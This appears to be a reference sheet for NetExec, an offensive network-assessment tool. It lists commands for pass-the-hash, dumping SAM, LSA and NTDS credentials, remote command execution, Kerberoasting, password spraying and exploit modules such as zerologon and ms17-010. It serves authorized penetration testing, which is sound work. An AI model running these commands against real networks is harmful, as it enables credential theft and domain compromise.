# NetExec (nxc) — multi-protocol network exploitation

- **Version:** 1.5.1 "Yippie-Ki-Yay" (commit f08f65a4)
- **Binaries:** `/usr/local/bin/nxc`, `/usr/local/bin/netexec`
- **Help snapshots:** [`help.txt`](help.txt) plus per-protocol
  `help-smb.txt`, `help-ldap.txt`, `help-winrm.txt`, `help-mssql.txt`,
  `help-ssh.txt`, `help-ftp.txt`, `help-rdp.txt`, `help-wmi.txt`,
  `help-nfs.txt`, `help-vnc.txt`
- **Docs:** https://www.netexec.wiki/
- **Source:** https://github.com/Pennyw0rth/NetExec

> **Deep-research scenarios:** [`SCENARIOS.md`](SCENARIOS.md)

## What it does

NetExec (successor to CrackMapExec) is a swiss-army knife for assessing large
networks. It authenticates across SMB, LDAP, WinRM, MSSQL, SSH, FTP, RDP, WMI,
NFS, and VNC; enumerates users/shares/sessions/policies; dumps credentials; runs
commands; and executes modules for known vulnerabilities.

## Protocols and typical use

| Protocol | Command | Primary use |
|----------|---------|-------------|
| SMB | `nxc smb` | Shares, users, sessions, SAM/LSA/NTDS, command exec, relay checks |
| LDAP | `nxc ldap` | AD enumeration, BloodHound, ADCS, Kerberoast/ASREP |
| WinRM | `nxc winrm` | Remote PowerShell command execution |
| MSSQL | `nxc mssql` | SQL queries, xp_cmdshell, impersonation |
| SSH | `nxc ssh` | Credential validation, command execution |
| FTP | `nxc ftp` | Anonymous/credential access, file listing |
| RDP | `nxc rdp` | Credential validation, screenshot (with module) |
| WMI | `nxc wmi` | WMI queries and execution |
| NFS | `nxc nfs` | Export enumeration and file access |
| VNC | `nxc vnc` | Authentication checks |

## Generic syntax

```bash
nxc <protocol> <target(s)> [auth] [action]
```

Targets accept IPs, ranges, CIDRs, hostnames, FQDNs, files, Nmap XML, and
Nessus files.

## Generic options

| Flag | Meaning |
|------|---------|
| `-u, --username` | Username(s) or file(s) |
| `-p, --password` | Password(s) or file(s) |
| `-H, --hash` | NTLM hash(es) or file(s) |
| `-id` | DB credential ID(s) |
| `-d, --domain` | Domain |
| `--local-auth` | Local account auth on each target |
| `-k, --kerberos` | Kerberos auth |
| `--use-kcache` | Use `KRB5CCNAME` ccache |
| `--aesKey` | AES key (128/256) |
| `--kdcHost` | KDC FQDN |
| `--pfx-cert`, `--pem-cert`, `--pem-key` | Certificate auth |
| `-t, --threads` | Concurrency (default 256) |
| `--jitter` | Random delay |
| `--exclude-hosts` | Exclude hosts |
| `--continue-on-success` | Keep trying after a valid credential |
| `--no-bruteforce` | Pair user1→pass1, user2→pass2 |
| `--gfail-limit`, `--ufail-limit`, `--fail-limit` | Lockout protection |
| `--log` | Write results to file |
| `-6` | Force IPv6 |
| `--dns-server`, `--dns-tcp`, `--dns-timeout` | DNS controls |
| `--verbose`, `--debug`, `--no-progress` | Output control |
| `-L, --list-modules` | List modules |
| `-M, --module` | Run a module |
| `-o` | Module options |

## SMB essentials

```bash
# Validate credentials across a subnet
nxc smb 10.10.10.0/24 -u user -p 'Password123' -d CORP

# Pass-the-hash
nxc smb 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Local auth
nxc smb 10.10.10.5 -u administrator -p 'Pass' --local-auth

# Enumerate shares / users / groups / sessions / policy
nxc smb 10.10.10.5 -u user -p pass --shares
nxc smb 10.10.10.5 -u user -p pass --users
nxc smb 10.10.10.5 -u user -p pass --groups
nxc smb 10.10.10.5 -u user -p pass --local-groups
nxc smb 10.10.10.5 -u user -p pass --sessions
nxc smb 10.10.10.5 -u user -p pass --loggedon-users
nxc smb 10.10.10.5 -u user -p pass --pass-pol
nxc smb 10.10.10.5 -u user -p pass --rid-brute 4000

# Credential dumping (admin required)
nxc smb 10.10.10.5 -u administrator -p pass --sam
nxc smb 10.10.10.5 -u administrator -p pass --lsa
nxc smb 10.10.10.5 -u administrator -p pass --ntds

# Command execution
nxc smb 10.10.10.5 -u administrator -p pass -x 'whoami /all'
nxc smb 10.10.10.5 -u administrator -p pass -X 'Get-Process'

# Find hosts without SMB signing (relay targets)
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# Spider shares
nxc smb 10.10.10.5 -u user -p pass --spider Shared --pattern password --content
```

Key SMB enumeration flags: `--shares`, `--exclude-shares`, `--dir`, `--disks`,
`--interfaces`, `--users`, `--users-export`, `--groups`, `--local-groups`,
`--computers`, `--pass-pol`, `--rid-brute`, `--smb-sessions`, `--reg-sessions`,
`--loggedon-users`, `--qwinsta`, `--tasklist`, `--taskkill`, `--wmi-query`,
`--spider`, `--pattern`, `--regex`, `--put-file`, `--get-file`, `--get-folder`.

## LDAP essentials

```bash
# Basic AD enumeration
nxc ldap 10.10.10.10 -u user -p pass -d CORP

# Kerberoasting / AS-REP roasting
nxc ldap 10.10.10.10 -u user -p pass -d CORP --kerberoasting kerb.txt
nxc ldap 10.10.10.10 -u user -p pass -d CORP --asreproast asrep.txt

# BloodHound collection
nxc ldap 10.10.10.10 -u user -p pass -d CORP --bloodhound --collection All

# ADCS enumeration
nxc ldap 10.10.10.10 -u user -p pass -d CORP -M adcs

# Password policy / users / groups
nxc ldap 10.10.10.10 -u user -p pass -d CORP --pass-pol
nxc ldap 10.10.10.10 -u user -p pass -d CORP --users
nxc ldap 10.10.10.10 -u user -p pass -d CORP --groups
```

Run `nxc ldap -h` for the full list; see [`help-ldap.txt`](help-ldap.txt).

## WinRM / MSSQL / SSH / FTP

```bash
# WinRM command execution
nxc winrm 10.10.10.5 -u administrator -p pass -x 'whoami'

# MSSQL: query, xp_cmdshell, impersonation
nxc mssql 10.10.10.5 -u sa -p pass -q 'SELECT @@version'
nxc mssql 10.10.10.5 -u sa -p pass -x 'whoami'
nxc mssql 10.10.10.5 -u sa -p pass --local-auth

# SSH
nxc ssh 10.10.10.5 -u root -p pass -x 'id'

# FTP
nxc ftp 10.10.10.5 -u anonymous -p '' --ls
```

## Modules

```bash
nxc smb -L                         # list modules
nxc smb -M <module> --options      # show module options
nxc smb 10.10.10.5 -u user -p pass -M ms17-010
nxc smb 10.10.10.5 -u user -p pass -M zerologon
nxc smb 10.10.10.5 -u user -p pass -M petitpotam -o LISTENER=10.10.10.99
nxc smb 10.10.10.5 -u user -p pass -M gpp_password
nxc ldap 10.10.10.10 -u user -p pass -M adcs
```

Notable modules: `ms17-010`, `zerologon`, `printnightmare`, `smbghost`,
`nopac`, `petitpotam`, `printerbug`, `dfscoerce`, `shadowcoerce`,
`gpp_password`, `gpp_autologin`, `spider_plus`, `adcs`, `bloodhound`,
`backup_operator`, `add-computer`, `change-password`, `timeroast`, `wcc`.

**Removed modules** are marked `[REMOVED]` in `-L`; functionality moved into
`enum_cve` or elsewhere.

## Recipes

```bash
# Spray one password across users (mind lockout limits)
nxc smb 10.10.10.0/24 -u users.txt -p 'Spring2026!' --gfail-limit 3 --ufail-limit 2

# Validate a credential list pairs
nxc smb targets.txt -u users.txt -p passwords.txt --no-bruteforce

# Full SMB sweep with shares and users
nxc smb 10.10.10.0/24 -u user -p pass --shares --users --groups --sessions

# Dump NTDS from a DC
nxc smb 10.10.10.10 -u administrator -p pass --ntds --history

# BloodHound from LDAP
nxc ldap dc.corp.local -u user -p pass -d CORP --bloodhound --collection All

# Execute via WinRM with PowerShell
nxc winrm 10.10.10.5 -u administrator -p pass -X 'Get-LocalUser'

# SQL xp_cmdshell
nxc mssql 10.10.10.5 -u sa -p pass -M mssql_priv
```

## Gotchas

- **Lockout risk:** always set `--gfail-limit`/`--ufail-limit` and check policy first.
- NTLM pass-the-hash needs the full `LM:NT` pair (or just NT in many cases).
- `--local-auth` is essential for workgroup/local accounts.
- `--ntds` requires Domain Admin (or equivalent) on a DC.
- Modules marked `[REMOVED]` need another tool/flag; check `-L` output.
- Command execution methods (`wmiexec`, `smbexec`, `atexec`, `mmcexec`) leave
  different artifacts; choose deliberately.
- Default concurrency is high (256); lower it on fragile networks.
- Use only in authorized engagements — this tool is extremely loud in logs.

## References

- Docs: https://www.netexec.wiki/
- Module list: `nxc <proto> -L`
- Source: https://github.com/Pennyw0rth/NetExec
- Discord: https://discord.gg/pjwUTQzg8R
